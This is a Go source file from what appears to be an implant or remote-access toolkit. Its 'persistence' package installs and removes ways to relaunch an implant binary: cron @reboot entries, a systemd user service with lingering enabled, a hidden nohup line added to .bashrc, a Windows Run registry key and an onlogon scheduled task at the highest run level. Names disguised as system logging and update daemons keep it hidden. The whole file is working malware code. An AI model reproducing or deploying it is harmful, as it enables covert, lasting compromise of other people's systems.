// Package persistence installs/removes implant persistence mechanisms.
// Methods: cron, systemd (user), bashrc, registry (Windows), schtask (Windows).
package persistence

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"text/template"
	"bytes"
)

// Install installs the specified persistence mechanism.
// method: "cron" | "systemd" | "bashrc" | "registry" | "schtask" | "wmi"
// path:   path of the implant binary on the target
// name:   service/task/cron name
func Install(method, path, name string) error {
	if path == "" {
		self, err := os.Executable()
		if err != nil {
			return err
		}
		path = self
	}
	if name == "" {
		name = "systemd-journalctl"
	}

	switch method {
	case "cron":
		return installCron(path, name)
	case "systemd":
		return installSystemd(path, name)
	case "bashrc", "profile":
		return installBashrc(path)
	case "registry":
		return installRegistry(path, name)
	case "schtask":
		return installSchedTask(path, name)
	default:
		return fmt.Errorf("persistence: unknown method %q", method)
	}
}

// Remove removes a previously installed persistence mechanism.
func Remove(method, name string) error {
	switch method {
	case "cron":
		return removeCron(name)
	case "systemd":
		return removeSystemd(name)
	case "bashrc":
		return removeBashrc()
	case "registry":
		return removeRegistry(name)
	case "schtask":
		return removeSchedTask(name)
	default:
		return fmt.Errorf("persistence: unknown method %q", method)
	}
}

// ── Linux: cron ───────────────────────────────────────────────────────────────

func installCron(binPath, name string) error {
	if runtime.GOOS == "windows" {
		return fmt.Errorf("cron: not on windows")
	}
	// Add to user crontab: @reboot <path>
	entry := fmt.Sprintf("@reboot %s # %s\n", binPath, name)

	// Read existing crontab
	existing := ""
	out, _ := exec.Command("crontab", "-l").Output()
	existing = string(out)

	if strings.Contains(existing, binPath) {
		return nil // already installed
	}

	new := existing + entry
	cmd := exec.Command("crontab", "-")
	cmd.Stdin = strings.NewReader(new)
	return cmd.Run()
}

func removeCron(name string) error {
	if runtime.GOOS == "windows" {
		return nil
	}
	out, err := exec.Command("crontab", "-l").Output()
	if err != nil {
		return nil
	}
	var lines []string
	for _, line := range strings.Split(string(out), "\n") {
		if !strings.Contains(line, name) {
			lines = append(lines, line)
		}
	}
	cmd := exec.Command("crontab", "-")
	cmd.Stdin = strings.NewReader(strings.Join(lines, "\n"))
	return cmd.Run()
}

// ── Linux: systemd user service ───────────────────────────────────────────────

const systemdUnitTpl = `[Unit]
Description={{.Desc}}
After=network.target

[Service]
Type=simple
ExecStart={{.BinPath}}
Restart=on-failure
RestartSec=30
KillMode=process

[Install]
WantedBy=default.target
`

func installSystemd(binPath, name string) error {
	if runtime.GOOS == "windows" {
		return fmt.Errorf("systemd: not on windows")
	}

	home, _ := os.UserHomeDir()
	unitDir := filepath.Join(home, ".config", "systemd", "user")
	if err := os.MkdirAll(unitDir, 0700); err != nil {
		return err
	}

	unitFile := filepath.Join(unitDir, name+".service")
	tpl := template.Must(template.New("unit").Parse(systemdUnitTpl))
	var buf bytes.Buffer
	tpl.Execute(&buf, map[string]string{
		"Desc":    "System logging daemon",
		"BinPath": binPath,
	})

	if err := os.WriteFile(unitFile, buf.Bytes(), 0600); err != nil {
		return err
	}

	exec.Command("systemctl", "--user", "daemon-reload").Run()
	exec.Command("systemctl", "--user", "enable", "--now", name+".service").Run()
	exec.Command("loginctl", "enable-linger").Run()
	return nil
}

func removeSystemd(name string) error {
	if runtime.GOOS == "windows" {
		return nil
	}
	exec.Command("systemctl", "--user", "disable", "--now", name+".service").Run()
	home, _ := os.UserHomeDir()
	unitFile := filepath.Join(home, ".config", "systemd", "user", name+".service")
	return os.Remove(unitFile)
}

// ── Linux: .bashrc / .profile injection ──────────────────────────────────────

const bashrcMarker = "# system-update-daemon"

func installBashrc(binPath string) error {
	if runtime.GOOS == "windows" {
		return fmt.Errorf("bashrc: not on windows")
	}
	home, _ := os.UserHomeDir()
	rc := filepath.Join(home, ".bashrc")

	content, _ := os.ReadFile(rc)
	if strings.Contains(string(content), bashrcMarker) {
		return nil
	}

	entry := fmt.Sprintf("\n%s\n(nohup %s &>/dev/null &)\n", bashrcMarker, binPath)
	f, err := os.OpenFile(rc, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = f.WriteString(entry)
	return err
}

func removeBashrc() error {
	if runtime.GOOS == "windows" {
		return nil
	}
	home, _ := os.UserHomeDir()
	rc := filepath.Join(home, ".bashrc")
	content, err := os.ReadFile(rc)
	if err != nil {
		return nil
	}
	var lines []string
	skip := false
	for _, line := range strings.Split(string(content), "\n") {
		if strings.Contains(line, bashrcMarker) {
			skip = true
		}
		if !skip {
			lines = append(lines, line)
		} else {
			skip = false // skip one line after marker
		}
	}
	return os.WriteFile(rc, []byte(strings.Join(lines, "\n")), 0600)
}

// ── Windows: Registry Run key ─────────────────────────────────────────────────

func installRegistry(binPath, name string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("registry: not on windows")
	}
	return registryRunKey(name, binPath, false)
}

func removeRegistry(name string) error {
	if runtime.GOOS != "windows" {
		return nil
	}
	return registryDeleteKey(name)
}

// ── Windows: Scheduled Task ───────────────────────────────────────────────────

func installSchedTask(binPath, name string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("schtask: not on windows")
	}
	// schtasks /create /tn <name> /tr <path> /sc onlogon /ru "" /f
	cmd := exec.Command("schtasks.exe",
		"/create", "/tn", name, "/tr", binPath,
		"/sc", "onlogon", "/rl", "highest", "/f")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("schtask: %v: %s", err, out)
	}
	return nil
}

func removeSchedTask(name string) error {
	if runtime.GOOS != "windows" {
		return nil
	}
	return exec.Command("schtasks.exe", "/delete", "/tn", name, "/f").Run()
}
